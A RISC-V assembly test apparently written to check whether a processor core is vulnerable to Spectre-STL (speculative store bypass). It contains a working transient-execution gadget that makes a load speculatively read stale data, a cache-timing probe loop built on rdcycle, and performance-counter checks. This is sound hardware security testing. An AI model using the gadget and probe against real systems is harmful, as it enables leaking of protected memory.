#include "hpm_macros.h"

.text

/*
Spectre-STL
Author: Franz Fuchs

The store and the load go to the same address, but memory
disambiguation resolves them speculatively as non-dependent.
Therefore the load is issued before the store returns stale
data.

load to: 0x0000000080010400

HPM measurements

Loads microachitecturally : 5
Loads architecturally:      3
*/

spec_stl:

    lla s0, mem_2
    lla s1, mem
#ifdef VCU_118
    li s2, 0xc0010000
#else
    li s2, 0x80010000
#endif
    li a0, 0x200
    li s5, 0x400
    sd s5, 0(s1)
    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to t1
    HPM_M_READ_X (t1, 3)
    // do attack
    jal x1, store_funct
    // read value of counter 3 and store it to t2
    HPM_M_READ_X (t2, 3)


probe:

#ifdef VCU_118
  li t2, 0xc0010200
  li t6, 0xc0005000
#else
  li t2, 0x80010200
  li t6, 0x80005000
#endif

add t4, x0, x0
addi t5, x0, 16

probe_loop:
  rdcycle t0
  ld t3, 0(t2)
  rdcycle t1
  sub t1, t1, t0
  sd t1, 0(t6)
  addi t2, t2, 0x40
  addi t6, t6, 8
  addi t4, t4, 1
  blt t4, t5, probe_loop
  nop
  nop

    // if successful, we expect 5 loads to have happened
    // 3 architectural loads in store_funct
    // two transient loads for the latter two loads in
    // store_funct
    HPM_TEST(t1, t2, 5)

store_funct:

    ld s3, 0(s0)
    sd a0, 0(s3)
    // at this point the following holds:
    // s1 = s3
    ld a1, 0(s1)
    add s4, s2, a1
    ld s4, 0(s4)
    jalr x0, ra

.data

mem:
  .dword 0x0000000000000400
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

mem_2:
#ifdef VCU_118
  .dword 0x00000000c0020000
#else
  .dword 0x0000000080020000
#endif
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
